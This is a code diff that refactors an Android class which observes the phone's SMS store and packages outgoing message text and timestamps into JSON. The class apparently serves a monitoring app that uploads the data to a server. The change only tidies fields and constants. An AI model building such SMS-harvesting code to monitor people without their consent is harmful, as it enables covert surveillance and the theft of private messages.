@@ -5,15 +5,13 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import android.content.Context;
-import android.content.SharedPreferences;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
-import android.preference.PreferenceManager;
 
+import com.inet.android.request.ConstantRequest;
 import com.inet.android.request.DataRequest;
-import com.inet.android.request.RequestMakerImpl;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 /**
@@ -26,17 +24,13 @@ public class SmsSentObserver extends ContentObserver {
 
 	private static final String TAG = "SMSTSentObserver";
 	private static final Uri STATUS_URI = Uri.parse("content://sms");
-	String dir = null;
-	SharedPreferences sp;
 	private Context mContext;
-	RequestMakerImpl req;
 	private static long id = 0;
-	Handler handler;
+	private Handler handler;
 
 	public SmsSentObserver(Handler handler, Context ctx) {
 		super(handler);
 		mContext = ctx;
-		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 	}
 
 	public SmsSentObserver(Handler handler) {
@@ -54,9 +48,6 @@ public class SmsSentObserver extends ContentObserver {
 	}
 
 	public void onChange(boolean selfChange) {
-		dir = "6";
-		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-
 		try {
 			Logging.doLog(TAG, "Notification on SMS observer",
 					"Notification on SMS observer");
@@ -114,7 +105,7 @@ public class SmsSentObserver extends ContentObserver {
 									info.put("data", message);
 
 									object.put("time", ConvertDate.logTime());
-									object.put("type", dir);
+									object.put("type", ConstantRequest.TYPE_OUTGOING_SMS_REQUEST);
 									object.put("info", info);
 									data.put(object);
 									jsonObject.put("data", data);
